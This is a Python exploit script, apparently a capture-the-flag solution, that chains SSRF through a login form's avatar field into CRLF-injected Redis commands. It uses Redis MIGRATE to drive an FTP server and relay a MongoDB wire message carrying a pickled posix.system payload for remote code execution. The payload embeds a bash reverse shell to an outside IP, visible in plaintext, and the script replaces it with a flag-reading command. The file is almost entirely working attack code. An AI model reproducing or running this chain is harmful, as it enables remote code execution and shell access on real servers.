import urllib.request
import random
import time
import pickle
import os
import datetime
import base64
import threading
import requests
import re
def queryq(q):
	s = requests.Session()
	r = random.randint(11000,50000)
	print("QUERY")
	s.post("http://23.98.68.11:8088/login",data={"username":f"testffqq{r}","password":f"testffffff2ffaaaaad{r}","avatar":q})
def g():
	redis_do = f"""MIGRATE {ftp_addr} {ftp_port} "" 0 60000 KEYS injectlmao"""
	queryq(f"http://{redis_addr}:{redis_port}/?\r\n{redis_do}\r\n\r\nLOL")

ftp_addr = "172.20.0.2"
ftp_port = "8877"
redis_addr = "172.20.0.4"
redis_port = "6379"
mongo_addr = "172,20,0,5,105,137"

def tos(b):
	b = str(b)[12:]
	return b[0:-2].replace('"','\\x22')
payload = "100100007348336600000000d40700000000000061646d696e2e24636d640000000000ffffffffe90000001069736d6173746572000100000003636c69656e7400bc00000003647269766572002b000000026e616d65000800000050794d6f6e676f000276657273696f6e0007000000332e31312e320000036f73005c000000027479706500060000004c696e757800026e616d6500060000004c696e7578000261726368697465637475726500070000007838365f3634000276657273696f6e0011000000352e342e302d34322d67656e65726963000002706c6174666f726d001600000043507974686f6e20332e382e352e66696e616c2e30000004636f6d7072657373696f6e000500000000006c01000051dcb07400000000dd07000000000000007f00000002757064617465000900000073657373696f6e7300086f7264657265640001036c736964001e0000000569640010000000046a9a9140c2d74f0f973abcc6218906a90002246462000600000061646d696e00032472656164507265666572656e63650017000000026d6f646500080000007072696d61727900000001d70000007570646174657300cb0000000371003a000000026964002d00000073657373696f6e3a39323261666563652d316466342d346337342d613138392d3361323637313031653064650000037500750000000324736574006a0000000576616c005b0000000080049550000000000000008c05706f736978948c0673797374656d9493948c3562617368202d63202262617368202d69203e26202f6465762f7463702f34352e37362e3138372e3139312f3133333720303e26312294859452942e0000086d756c7469000008757073657274000000"
payload = bytearray.fromhex(payload).replace(b'bash -c "bash -i >& /dev/tcp/45.76.187.191/1337 0>&1"',b'//////////////////////////////////readflag > /tmp/aaa')
payload = payload.replace(b"922afece-1df4-4c74-a189-3a267101e0de",b"29faa590-07ad-4a93-b81a-f44ffcd7870d")
payload = [payload[i:i+50] for i in range(0, len(payload), 50)]

redis_inj = f"""set "oh" "{tos(payload[0])}" """
queryq(f"http://{redis_addr}:{redis_port}/\r\n{redis_inj}\r\nLOL")

payload = payload[1:]
for i in payload:
	redis_inj = f"""append "oh" "{tos(i)}" """
	print(redis_inj)
	queryq(f"http://{redis_addr}:{redis_port}/?\r\n{redis_inj}\r\n\r\nLOL")

redis_do = f"""EVAL "redis.call('SET',redis.call('get','oh'),'')" 0 """
queryq(f"http://{redis_addr}:{redis_port}/?\r\n{redis_do}\r\n\r\nLOL")

##############
ftp_cmd = """
USER fan
PASS root
PASV
STOR files/test.txt
""".replace("\n","\\r\\n")
redis_do = f"""set injectlmao "{ftp_cmd}" """
queryq(f"http://{redis_addr}:{redis_port}/?\r\n{redis_do}\r\n\r\nLOL")
x = threading.Thread(target=g, args=())
x.start()
################
time.sleep(1)
for i in range(2000,2031):
	redis_do = f"""EVAL "redis.call('MIGRATE','{ftp_addr}',{i},'',0,5000,'KEYS',redis.call('get','oh'))" 0"""
	queryq(f"http://{redis_addr}:{redis_port}/?\r\n{redis_do}\r\n\r\nLOL")
############# Send to mongo
ftp_cmd = """
USER fan
PASS root
PORT 127,0,0,1,4,0
TYPE I
REST 37
RETR files/test.txt
""".replace("\n","\\r\\n").replace("127,0,0,1,4,0",mongo_addr)
redis_inj = f"""set injectlmao "{ftp_cmd}" """
redis_do = f"""MIGRATE {ftp_addr} {ftp_port} "" 0 5000 KEYS injectlmao"""
queryq(f"http://{redis_addr}:{redis_port}/?\r\n{redis_inj}\r\n{redis_do}\r\nLOL")
